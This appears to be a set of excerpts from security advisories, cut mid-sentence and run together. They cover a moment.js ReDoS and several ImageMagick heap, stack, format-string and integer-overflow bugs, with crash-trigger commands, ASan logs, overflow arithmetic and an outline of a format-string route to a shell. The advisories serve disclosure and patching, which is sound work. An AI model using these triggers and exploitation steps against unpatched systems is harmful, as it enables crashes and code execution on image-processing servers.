vulnerable to Inefficient Regular Expression Complexity","details":"### Impact\n\n* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs\n* noticeable slowdown is observed with inputs above 10k characters\n* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks\n\n### Patches\nThe problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.\n\n### Workarounds\nIn general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.\n\n### References\nThere is an excellent writeup of the issue here:

storing the results in a `png_uint32`. The operations at \\[0\\] and \\[1\\] are safe, since `mng_info->magn_ml` and `mng_info->magn_mx` are both 16-bit unsigned integers, but both the multiplication at \\[2\\] and the addition of the result of that multiplication to `magnified_width` can overflow, leading to a value of `magnified_width` that is smaller than required.\n\nWhen we then operate on the pixel buffers, we use the original parameters for the magnification, and we assume (reasonably?) that the output buffer is larger than the input buffer when calculating where to write the upsampled/magnified pixel values. Unfortunately, after the overflow has happened, this assumption is no longer true, and the calculation at \\[3\\] will end up with a `q` pointer outside the buffer bounds.\n\nThis issue leads to an out-of-bounds write of controlled data beyond the bounds of a heap allocation.\n\nTriggering this issue requires an `image` with large `columns` or `rows` (\\~65535) which should be prevented by all of the example security policies (which set `width`/`height` limits of `8KP`).\n\n## **Affected Version(s)**\n\nVerified on current HEAD (305e383c8ac7b30bc2ee96ab8c43ec96217ec2a9) and latest stable

BlobStream Forward-Seek Under-Allocation","details":"**Reporter:** Lumina Mescuwa  \n**Product:** ImageMagick 7 (MagickCore)  \n**Component:** `MagickCore/blob.c` (Blob I/O - BlobStream)  \n**Tested:** 7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI  \n**Impact:** Heap out-of-bounds **WRITE** (attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  \n\n---\n\n## Executive Summary\n\nFor memory-backed blobs (**BlobStream**), [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) permits advancing the stream **offset** beyond the current end without increasing capacity. The subsequent [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) then expands by **`quantum + length`** (amortized) instead of **`offset + length`**, and copies to `data + offset`. When `offset ≫ extent`, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.\n\n---\n\n## Affected Scope\n\n- **Versions confirmed:** 7.1.2-0, 7.1.2-1\n    \n- **Architectures:** Observed on macOS arm64; architecture-agnostic on LP64\n    \n- Paths: MagickCore blob subsystem — **BlobStream** ([`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) and [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938)).\n    \n- **Not required:** External delegates; special policies; integer wraparound\n    \n\n---\n\n## Technical Root Cause\n\n**Types (LP64):**  \n`offset: MagickOffsetType` (signed 64-bit)  \n`extent/length/quantum: size_t` (unsigned 64-bit)  \n`data: unsigned char*`\n\n**Contract mismatch:**\n\n- [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) (BlobStream) updates `offset` to arbitrary positions, including past end, **without** capacity adjustment.\n    \n- [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) tests `offset + length >= extent` and grows **by** `length + quantum`, doubles `quantum`, reallocates to `extent + 1`, then:\n    \n    ```\n    q = data + (size_t)offset;\n    memmove(q, src, length);\n    ```\n    \n    There is **no guarantee** that `extent ≥ offset + length` post-growth. With `offset ≫ extent`, `q` is beyond the allocation.\n    \n\n**Wrap-free demonstration:**  \nInitialize `extent=1`, write one byte (`offset=1`), seek to `0x10000000` (256 MiB), then write 3–4 bytes. Growth remains << `offset + length`; the copy overruns the heap buffer.\n\n---\n\n## Exploitability & Reachability\n\n- **Primitive:** Controlled bytes written at a controlled displacement from the buffer base.\n    \n- **Reachability:** Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract **permits** it, thus creating a latent sink for first- or third-party encoders/writers.\n    \n- **Determinism:** Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.\n    \n\n---\n\n## Impact Assessment\n\n- **Integrity:** High - adjacent object/metadata overwrite plausible.\n    \n- **Availability:** High - reliably crashable (ASan and non-ASan).\n    \n- **Confidentiality:** High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.\n    \n- **RCE plausibility:** Typical of heap OOB writes in long-lived image services; allocator/layout dependent.\n    \n\n---\n\n## CVSS v3.1 Rationale (9.8)\n\n- **AV:N / PR:N / UI:N** - server-side image processing is commonly network-reachable without auth or user action.\n    \n- **AC:L** - a single forward seek + write suffices; no races or specialized state.\n    \n- **S:U** - corruption localized to the ImageMagick process.\n    \n- **C:H / I:H / A:H** - A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).\n    \n\n_Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics._\n\n---\n\n## Violated Invariant\n\n> **Before copying `length` bytes at `offset`, enforce `extent ≥ offset + length` with overflow-checked arithmetic.**\n\nThe BlobStream growth policy preserves amortized efficiency but fails to enforce this **per-write** safety invariant.\n\n---\n\n## Remediation (Principle)\n\nIn [`WriteBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938) (BlobStream case):\n\n1. **Checked requirement:**  \n    `need = (size_t)offset + length;` → if `need < (size_t)offset`, overflow → fail.\n    \n2. **Ensure capacity ≥ need:**  \n    `target = MagickMax(extent + quantum + length, need);`  \n    (Optionally loop, doubling `quantum`, until `extent ≥ need` to preserve amortization.)\n    \n3. **Reallocate to `target + 1` before copying;** then perform the move.\n    \n\n**Companion hardening (recommended):**\n\n- Document or restrict [`SeekBlob()`](https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134) on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.\n    \n- Centralize blob arithmetic in checked helpers.\n    \n- Unit tests: forward-seek-then-write (success and overflow-reject).\n    \n\n---\n\n## Regression & Compatibility\n\n- **Behavior change:** Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).\n    \n- **Memory profile:** Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.\n    \n\n---\n\n## Vendor Verification Checklist\n\n- Reproduce with a minimal in-memory BlobStream harness under ASan.\n    \n- Apply fix; verify `extent ≥ offset + length` at all write sites.\n    \n- Add forward-seek test cases (positive/negative).\n    \n- Audit other growth sites (`SetBlobExtent`, stream helpers).\n    \n- Clarify BlobStream seek semantics in documentation.\n    \n- Unit test: forward seek to large offset on **BlobStream** followed by 1–8 byte writes; assert either growth to `need` or clean failure.\n    \n\n---\n\n# PoC / Reproduction / Notes\n\n## Environment\n\n- **OS/Arch:** macOS 14 (arm64)\n

The `format` variable here is `\"%%\"`. At this point, it is safe to access `*(format + 2)` but not safe to access `*(format + 3)`.\n\n```c\nfor (p=strchr(format,'%'); p != (char *) NULL; p=strchr(p+1,'%'))\n{\n  q=(char *) p+1;\n  if (*q == '%')\n    {\n      p=q+1;\n      continue;\n    }\n```\n\nThe first `strchr` call returns a pointer equal to `format` and assigns it to `p`. Then `q` is initialized with `p + 1` (`format + 1`), and `*q` is `'%'`, so the code enters the if branch. Here, `p` is reassigned to `q + 1` (`format + 2`).\n\nIn the next iteration, `p + 1` (`format + 3`) is passed to `strchr`, and when `strchr` accesses it, this causes an out-of-bounds

has a Stack Buffer Overflow in image.c","details":"Hi, we have found a stack buffer overflow and would like to report this issue.\nCould you confirm if this qualifies as a security vulnerability? I am happy to provide any additional information needed.\n\n## Summary\n\nIn ImageMagick's `magick mogrify` command, specifying multiple consecutive `%d` format specifiers in a filename template causes internal pointer arithmetic to generate an address below the beginning of the stack buffer, resulting in a stack overflow through `vsnprintf()`.\n\n### Additional information\n\n Upon further investigation, we found that the same issue occurs not only with mogrify but also with the following subcommands: compare, composite, conjure, convert, identify, mogrify, and montage.\n\nFurthermore, we confirmed that this vulnerability has the potential to lead to RCE. RCE is possible when ASLR is disabled and there is a suitable one_gadget in libc, provided that options and filenames can be controlled.\n\n## Details\n\n- **Vulnerability Type:** CWE-124: Buffer Underwrite\n- **Affected Component:** MagickCore/image.c - Format processing within InterpretImageFilename()\n- **Affected Version:** ImageMagick 7.1.1-47 (as of commit 82572afc, June 2025)\n- **CWE-124: Buffer Underwrite:** A vulnerability where writing occurs to memory addresses before the beginning of a buffer. This is caused by a design flaw in fixed offset correction, resulting in negative pointer arithmetic during consecutive format specifier processing.\n\n## Reproduction\n\n### Tested Environment\n\n- **Operating System:** Ubuntu 22.04 LTS\n- **Architecture:** x86_64\n- **Compiler:** gcc with AddressSanitizer (gcc version: 11.4.0)\n\n### Reproduction Steps\n\n```bash\n# Clone source\ngit clone --depth 1 --branch 7.1.1-47 https://github.com/ImageMagick/ImageMagick.git ImageMagick-7.1.1\ncd ImageMagick-7.1.1\n\n# Build with ASan\nCFLAGS=\"-g -O0 -fsanitize=address -fno-omit-frame-pointer\" CXXFLAGS=\"$CFLAGS\" LDFLAGS=\"-fsanitize=address\" ./configure --enable-maintainer-mode --enable-shared && make -j$(nproc) && make install\n\n# Trigger crash\n./utilities/magick mogrify %d%d\n```\n\n### Output\n\n```plaintext\n==4155==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffda834caae at pc 0x7f1ea367fb27 bp 0x7ffda834b680 sp 0x7ffda834ae10\nWRITE of size 2 at 0x7ffda834caae thread T0\n    #0 0x7f1ea367fb26 in __interceptor_vsnprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1668\n    #1 0x7f1ea2dc9e3e in FormatLocaleStringList MagickCore/locale.c:470\n    #2 0x7f1ea2dc9fd9 in FormatLocaleString MagickCore/locale.c:495\n    #3 0x7f1ea2da0ad5 in InterpretImageFilename MagickCore/image.c:1696\n    #4 0x7f1ea2c6126b in ReadImages MagickCore/constitute.c:1051\n    #5 0x7f1ea27ef29b in MogrifyImageCommand MagickWand/mogrify.c:3858\n    #6 0x7f1ea278e95d in MagickCommandGenesis MagickWand/magick-cli.c:177\n    #7 0x560813499a0c in MagickMain utilities/magick.c:153\n    #8 0x560813499cba in main utilities/magick.c:184\n    #9 0x7f1ea1c0bd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #10 0x7f1ea1c0be3f in __libc_start_main_impl ../csu/libc-start.c:392\n    #11 0x560813499404 in _start (/root/workdir/ImageMagick/utilities/.libs/magick+0x2404)\n\nAddress 0x7ffda834caae is located in stack of thread T0 at offset 62 in frame\n    #0 0x7f1ea2c60f62 in ReadImages MagickCore/constitute.c:1027\n\n  This frame has 2 object(s):\n    [32, 40) 'images' (line 1033)\n    [64, 4160) 'read_filename' (line 1029) <== Memory access at offset 62 underflows this variable\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork\n      (longjmp and C++ exceptions *are* supported)\nSUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1668 in __interceptor_vsnprintf\nShadow bytes around the buggy address:\n  0x100035061900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100035061910: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100035061920: 00 00 00 00 00 00 00 00 f3 f3 f3 f3 f3 f3 f3 f3\n  0x100035061930: f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00\n  0x100035061940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x100035061950: f1 f1 00 f2 f2[f2]00 00 00 00 00 00 00 00 00 00\n  0x100035061960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100035061970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100035061980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x100035061990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x1000350619a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n  Shadow gap:              cc\n==4155==ABORTING\n```\n\n### Affected Code\n\nIn `MagickCore/image.c`, within the `InterpretImageFilename()` function:\n\n```c\nMagickExport size_t InterpretImageFilename(const ImageInfo *image_info,\n  Image *image,const char *format,int value,char *filename,\n  ExceptionInfo *exception)\n{\n...\n  for (p=strchr(format,'%');

However, in reality, there are formats with only 2 characters like `%d`, and formats with longer width specifications (e.g., `%010d`), so this uniform constant-based correction is inconsistent with actual template structures.\n\nAs a result, when the correction value becomes excessive, `offset` exceeds the relative position `p - format` within the template, generating a negative index. This static and template-independent design of the correction processing is the root cause of this vulnerability.\n\nThis causes `vsnprintf()` to write outside the stack buffer range, which is detected by AddressSanitizer as a `stack-buffer-overflow`.\n\n## Proposed Fix\n\nIn `MagickCore/image.c`, within the `InterpretImageFilename()` function:\n\n```c\nMagickExport size_t InterpretImageFilename(const ImageInfo *image_info,\n  Image *image,const char *format,int value,char *filename,\n  ExceptionInfo *exception)\n{\n...\n  /*--------Changed--------*/\n  ssize_t\n    field_width,\n    offset,\n    written; // Added\n  /*--------Changed--------*/\n...\n  for (p=strchr(format,'%'); p != (char *) NULL; p=strchr(p+1,'%'))\n  {\n    q=(char *) p+1;\n    if (*q == '%')\n      {\n        p=q+1;\n        continue;\n      }\n    field_width=0;\n    if (*q == '0')\n      field_width=(ssize_t) strtol(q,&q,10);\n    switch (*q)\n    {\n      case 'd':\n      case 'o':\n      case 'x':\n      {\n        q++;\n        c=(*q);\n        *q='\\0';\n        written = FormatLocaleString(filename+(p-format-offset),(size_t)\n          (MagickPathExtent-(p-format-offset)),p,value);\n        /*--------Changed--------*/\n        if (written <= 0 || written > (MagickPathExtent - (p - format - offset)))\n          return 0;\n        offset += (ssize_t)((q - p) - written);\n        /*--------Changed--------*/\n        *q=c;\n        (void) ConcatenateMagickString(filename,q,MagickPathExtent);\n        canonical=MagickTrue;\n        if (*(q-1) != '%')\n          break;\n        p++;\n        break;\n      }\n      case '[':\n      {\n        ...\n      }\n      default:\n        break;\n    }\n  }\n```\n- By updating `offset` based on the difference between template description length `(q - p)` and the number of output bytes `written`, buffer position consistency is maintained.\n- Correction is performed according to the actual template structure, ensuring stable behavior regardless of format length without relying on static constants.\n- Range checking of `written` allows detection of vsnprintf failures and excessive

In MagickCore/resize.c:ThumbnailImage(), the code computes:\nhttps://github.com/ImageMagick/ImageMagick/blob/0ba1b587be17543b664f7ad538e9e51e0da59d17/MagickCore/resize.c#L4625-L4629\ncausing a division by zero and immediate crash.\n\nThe issue is trivially triggerable without external input files (e.g., using `xc:white`).\n\n### Reproduction\nEnvironment\n```\nVersion: ImageMagick 7.1.2-1 (Beta) Q16-HDRI x86_64 0ba1b587b:20250812 https://imagemagick.org\nFeatures: Cipher DPC HDRI\nDelegates (built-in): bzlib fontconfig freetype jbig jng jpeg lcms lzma pangocairo png tiff x xml zlib\nCompiler: clang (14.0.0)\nOS/Arch: Linux x86_64\n```\nSteps\n```\n./bin/magick montage -geometry : xc:white null:\n```\nObserved result\n```\nIOT instruction (core dumped)\n# (Environment-dependent: SIGFPE/abort may be observed.)\n```\n\n## PoC\nNo external file required; the pseudo image xc:white suffices:\n```\n./bin/magick montage -geometry : xc:white null:\n```\n\n## Impact\n- **Denial of Service:** A divide-by-zero in `ThumbnailImage()` causes immediate abnormal termination (e.g., SIGFPE/abort), crashing the ImageMagick process.\n\n\n## Suggested fix\nDefensively reject zero dimensions early in `ThumbnailImage()`:\n```c\nif ((columns == 0) || (rows == 0)) {\n  (void) ThrowMagickException(exception, GetMagickModule(), OptionError,\n    \"InvalidGeometry\", \"thumbnail requires non-zero dimensions: %.20gx%.20g\",\n    (double) columns, (double) rows);\n  return (Image *) NULL;\n}\n```\nAdditionally, consider tightening validation in `GetGeometry()` so that colon-only (and similar malformed) inputs do not yield `WidthValue/HeightValue` with zero, or are rejected outright. Variants like `\"x:\"` or `\":x\"` may also need explicit handling (maintainer confirmation requested).\n\n## Credits\n### Team Daemon Fuzz Hunters\n**Bug Hunting Master Program,

An attacker can overwrite arbitrary memory regions, enabling a wide range of attacks from heap overflow to remote code execution.\n<br>\n\n## Details\n### root cause\n```\nMagickExport size_t InterpretImageFilename(const ImageInfo *image_info,\n  Image *image,const char *format,int value,char *filename,\n  ExceptionInfo *exception)\n{\n\n...\n\n  while ((cursor=strchr(cursor,'%')) != (const char *) NULL)\n  {\n    const char\n      *q = cursor;\n\n    ssize_t\n      offset = (ssize_t) (cursor-format);\n\n    cursor++;  /* move past '%' */\n    if (*cursor == '%')\n      {\n        /*\n          Escaped %%.\n        */\n        cursor++;\n        continue;\n      }\n    /*\n      Skip padding digits like %03d.\n    */\n    if (isdigit((int) ((unsigned char) *cursor)) != 0)\n      (void) strtol(cursor,(char **) &cursor,10);\n    switch (*cursor)\n    {\n      case 'd':\n      case 'o':\n      case 'x':\n      {\n        ssize_t\n          count;\n\n        count=FormatLocaleString(pattern,sizeof(pattern),q,value);\n        if ((count <= 0) || (count >= MagickPathExtent) ||\n            ((offset+count) >= MagickPathExtent))\n          return(0);\n        (void) CopyMagickString(p+offset,pattern,(size_t) (MagickPathExtent-\n          offset));\n        cursor++;\n        break;\n      }\n```\nWhen the InterpretImageFilename function processes a filename beginning with format specifiers such as %d, %o, or %x, the filename string is directly passed as a parameter to the FormatLocaleString function.\n<br>\n```\nMagickExport ssize_t FormatLocaleString(char *magick_restrict string,\n  const size_t length,const char *magick_restrict format,...)\n{\n  ssize_t\n    n;\n\n  va_list\n    operands;\n\n  va_start(operands,format);\n  n=FormatLocaleStringList(string,length,format,operands);\n  va_end(operands);\n  return(n);\n}\n```\n```\nMagickPrivate ssize_t FormatLocaleStringList(char *magick_restrict string,\n  const size_t length,const char *magick_restrict format,va_list operands)\n{\n...\nn=(ssize_t) _vsnprintf_l(string,length,format,locale,operands);\n```\nInside FormatLocaleString, the variable argument list is initialized through va_start, after which the format string processing occurs by interpreting the format specifiers and using corresponding values from CPU registers and the call stack as arguments for the formatting operations.\n<br>\n## PoC\n### 1.

The payload systematically overwrites return addresses on the stack, redirecting program execution to a one-gadget ROP chain that spawns a shell with the current process privileges.\n<br>\n\n**Exploitation Process:**\n1. Format string payload corrupts stack pointers through positional parameters\n2. Multiple 2-byte writes (%hn) progressively overwrite the return address  \n3. Final payload redirects execution to a one-gadget (0x00007ffff66ebc85)\n4. One-gadget executes `/bin/sh` with inherited process permissions\n<br>\n\n**Remote Exploitation Feasibility:**\nWhile this PoC demonstrates local shell execution with ASLR disabled, remote code execution is achievable in real-world scenarios through brute force attacks. When stack layout conditions are favorable, attackers can perform 1.5-byte return address brute force and 1.5-byte libc base address brute force to gain shell access.\n<br>\n\n**Important:** The numeric parameters within the format string payload are environment-dependent and may require modification for different target systems due to variations in memory layout and stack structure.\n\n**Note:** This demonstrates complete system compromise, as the attacker gains interactive shell access to the target system.\n<br>\n\n## Impact\nThis format string vulnerability enables attackers to achieve complete system compromise through arbitrary memory read/write operations and remote code execution. Attackers can access sensitive data stored in process memory, overwrite critical system structures, and execute arbitrary code with ImageMagick's privileges.\n\nThe vulnerability is particularly dangerous in web applications processing user-uploaded images and automated image processing systems. Successful exploitation can lead to privilege escalation, data exfiltration, and lateral movement within compromised networks.\n<br>\n\n## Suggested Fix\n\nTwo potential mitigation approaches:\n\n1. **Input Validation**: Add format string validation in `InterpretImageFilename` to reject filenames containing format specifiers (`%n`, `%s`, `%x`, etc.) before passing to `FormatLocaleString`\n2. **Safe Parsing**: Modify the format string processing to parse and validate each format specifier individually rather than passing the entire user-controlled string directly to `FormatLocaleString`\n<br>\n\n## Credits\n### Team Daemon Fuzz Hunters\n**Bug Hunting Master Program, HSpace/Findthegap**\n<br>\n\n**Woojin Park**\n@jin-156\n[1203kids@gmail.com](mailto:1203kids@gmail.com)\n\n**Hojun Lee**\n@leehohojune \n[leehojune@korea.ac.kr](mailto:leehojune@korea.ac.kr)\n\n**Youngin Won**\n@amethyst0225\n[youngin04@korea.ac.kr](mailto:youngin04@korea.ac.kr)\n\n**Siyeon Han**\n@hanbunny\n[kokosyeon@gmail.com](mailto:kokosyeon@gmail.com)\n\n# Additional notes from the ImageMagick team:\n\nOn many modern toolchains and OSes, format‑string exploits using %n are already mitigated or blocked by default (e.g., -Wformat-security, _FORTIFY_SOURCE, hardened libc behavior, ASLR/stack canaries). That can make exploitation impractical in typical builds so you might not be vulnerable but it would still be wise to upgrade to the most recent version. We also already provide the following mitigation:\n\nTo prevent unintended interpretation of the filename as a format string, users can explicitly disable format string parsing by defining the filename as a literal. This can be done using the following directive:\n\n- In wrappers: `filename:literal`\n- From the command line: `-define

(WriteBMPImage): 32-bit integer overflow when writing BMP scanline stride → heap buffer overflow","details":"## Summary\n\nA 32-bit integer overflow in the BMP encoder’s scanline-stride computation collapses `bytes_per_line` (stride) to a tiny value while the per-row writer still emits `3 × width` bytes for 24-bpp images. The row base pointer advances using the (overflowed) stride, so the first row immediately writes past its slot and into adjacent heap memory with attacker-controlled bytes. This is a classic, powerful primitive for heap corruption in common auto-convert pipelines.\n\n- **Impact:** Attacker-controlled heap out-of-bounds (OOB) write during conversion **to BMP**.\n    \n- **Surface:** Typical upload → normalize/thumbnail → `magick ... out.bmp` workers.\n    \n- **32-bit:** **Vulnerable** (reproduced with ASan).\n    \n- **64-bit:** Safe from this specific integer overflow (IOF) by arithmetic, but still add product/size guards.\n    \n- **Proposed severity:** **Critical 9.8** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n    \n\n---\n\n## Scope & Affected Builds\n\n- **Project:** ImageMagick (BMP writer path, `WriteBMPImage` in `coders/bmp.c`).\n    \n- **Commit under test:** `3fcd081c0278427fc0e8ac40ef75c0a1537792f7`\n    \n- **Version string from the run:** `ImageMagick 7.1.2-0 Q8 i686 9bde76f1d:20250712`\n    \n- **Architecture:** 32-bit i686 (**`sizeof(size_t) == 4`**) with ASan/UBSan.\n    \n- **Note on other versions:** Any release/branch with the same stride arithmetic and row loop is likely affected on 32-bit.\n    \n\n---\n\n## Root Cause (with code anchors)\n\n### Stride computation (writer)\n\n```c\nbytes_per_line = 4 * ((image->columns * bmp_info.bits_per_pixel + 31) / 32);\n```\n\n### Per-row base and 24-bpp loop (writer)\n\n```c\nq = pixels + ((ssize_t)image->rows - y - 1) * (ssize_t)bytes_per_line;\nfor (x = 0; x < (ssize_t)image->columns; x++) {\n  *q++ = B(...); *q++ = G(...); *q++ = R(...);  // writes 3 * width bytes\n}\n```\n\n### Allocation (writer)\n\n```c\npixel_info = AcquireVirtualMemory(image->rows,\n    MagickMax(bytes_per_line, image->columns + 256UL) * sizeof(*pixels));\npixels = (unsigned char *) GetVirtualMemoryBlob(pixel_info);\n```\n\n### Dimension “caps” (insufficient)\n\nThe writer rejects dimensions that don’t round-trip through `signed int`, but both overflow thresholds below are **≤ INT_MAX** on 32-bit, so the caps **do not prevent** the bug.\n\n---\n\n## Integer-Overflow Analysis (32-bit `size_t`)\n\nStride formula for 24-bpp:\n\n```\nbytes_per_line = 4 * ((width * 24 + 31) / 32)\n```\n\nThere are **two independent overflow hazards** on 32-bit:\n\n1. **Stage-1 multiply+add** in `(width * 24 + 31)`  \n    Overflow iff `width > ⌊(0xFFFFFFFF − 31) / 24⌋ = 178,956,969`  \n    → at **width ≥ 178,956,970** the numerator wraps small before `/32`, producing a **tiny** `bytes_per_line`.\n    \n2. **Stage-2 final ×4** after the division  \n    Let `q = (width * 24 + 31) / 32`. Final `×4` overflows iff `q > 0x3FFFFFFF`.  \n    Solving gives **width ≥ 1,431,655,765 (0x55555555)**.\n    \n\nBoth thresholds are **below** `INT_MAX` (≈2.147e9), so “int caps” don’t help.\n\n**Mismatch predicate (guaranteed OOB when overflowed):**  \nPer-row write for 24-bpp is `row_bytes = 3*width`. Safety requires `row_bytes ≤ bytes_per_line`.  \nUnder either overflow, `bytes_per_line` collapses → `3*width > bytes_per_line` holds → **OOB-write**.\n\n---\n\n## Concrete Demonstration\n\nChosen width: **`W = 178,957,200`** (just over Stage-1 bound)\n\n- Stage-1: `24*W + 31 = 4,294,972,831 ≡ 0x0000159F (mod 2^32)` → **5535**\n    \n- Divide by 32: `5535 / 32 = 172`\n    \n- Multiply by 4: `bytes_per_line = 172 * 4 = **688** bytes` ← tiny stride\n    \n- Per-row data (24-bpp): `row_bytes = 3*W = **536,871,600** bytes`\n    \n- Allocation used: `MagickMax(688, W+256) = **178,957,456** bytes`\n    \n- **Immediate OOB**: first row writes ~536MB into a 178MB region, starting at a base advanced by only 688 bytes.\n    \n---\n\n## Observed Result (ASan excerpt)\n\n```\nERROR: AddressSanitizer: heap-buffer-overflow on address 0x6eaac490\nWRITE of size 1 in WriteBMPImage coders/bmp.c:2309\n...\nallocated by:\n  AcquireVirtualMemory MagickCore/memory.c:747\n  WriteBMPImage coders/bmp.c:2092\n```\n\n- Binary: **ELF 32-bit i386**, Q8, non-HDRI\n    \n- Resources set to permit execution of the writer path (defense-in-depth limits relaxed for repro)\n    \n\n---\n\n## Exploitability & Risk\n\n- **Primitive:** Large, contiguous, attacker-controlled heap overwrite beginning at the scanline slot.\n    \n- **Control:** Overwrite bytes are sourced from attacker-supplied pixels (e.g., crafted input image to be converted to BMP).\n    \n- **Likely deployment:** Server-side, non-interactive conversion pipelines (UI:N).\n    \n- **Outcome:** At minimum, deterministic crash (DoS). On many 32-bit allocators, well-understood heap shaping can escalate to **RCE**.\n    \n\n**Note on 64-bit:** Without integer overflow, `bytes_per_line = 4 * ceil((3*width)/4) ≥ 3*width`, so the mismatch doesn’t arise.

without changing the algorithm (still `4*((W*bpp+31)/32)`). \n    \n- It **fixes the header** (`biSizeImage`) to be a checked product, instead of a potentially wrapped multiplication. \n    \n- It **guards allocation** where you presently allocate `rows × MagickMax(bytes_per_line, columns+256)`. \n    \n- The invariant `row_bytes ≤ bytes_per_line` ensures your 24-bpp emission loop (writes 3 bytes/pixel, then pads to `bytes_per_line`) can never exceed the per-row slot the code relies on. \n    \n\n---\n\n## Notes\n\n- **Behavior preserved**: The stride value for normal images is unchanged; only pathological integer states are rejected. \n    \n- **Header consistency**: `biSizeImage = rows * bytes_per_line` remains true by construction, but now cannot overflow a 32-bit DIB field. \n    \n- **Defensive alignment**: If you prefer, you can compute `bytes_per_line` as `((row_bytes + 3) & ~3U)`; it’s equivalent and may read clearer, but I kept the original formula with guards to minimize diff.\n    \n\nA slightly larger “helpers” variant (with `safe_mul_size` / `safe_add_size` utilities) also comes to mind, but the block above is the tightest patch that closes the 32-bit IOF→OOB class without touching unrelated code paths.\n\n\n\n### Appendix B — Arithmetic Worked Example (W=178,957,200)\n\n- `(24W + 31) mod 2^32 = 5535`\n    \n- `bytes_per_line = 4 * (5535/32) = 688`\n    \n- `row_bytes (24-bpp) = 536,871,600`\n    \n- Allocation via `MagickMax = 178,957,456` → immediate row 0 out-of-bounds.\n    \n\n### Appendix C — Raw ASan Log

has Integer Overflow in BMP Decoder (ReadBMP)","details":"## Summary\n\nCVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but **the fix is incomplete and ineffective**. The latest version **7.1.2-5 remains vulnerable** to the same integer overflow attack.\n\nThe patch added `BMPOverflowCheck()` but placed it **after** the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.\n\n**Affected Versions:**\n- ImageMagick < 7.1.2-2 (originally reported)\n- **ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)**\n\n**Platform and Configuration Requirements:**\n- 32-bit systems ONLY (i386, i686, armv7l, etc.)\n- Requires `size_t = 4 bytes`. (64-bit systems are **NOT vulnerable** (size_t = 8 bytes))\n- Requires modified resource limits: The default `width`, `height`, and `area` limits must have been manually increased (Systems using default ImageMagick resource limits are **NOT vulnerable**).\n\n---\n\n## Details(Root Cause Analysis)\n\n### Vulnerable Code Location\n\n**File:** `coders/bmp.c`  \n**Lines:** 1120-1122 (in version 7.1.2-5)\n\n### The Incomplete Patch\n\n```c\n// Line 1120: Integer overflow happens HERE\nextent = image->columns * bmp_info.bits_per_pixel;  // 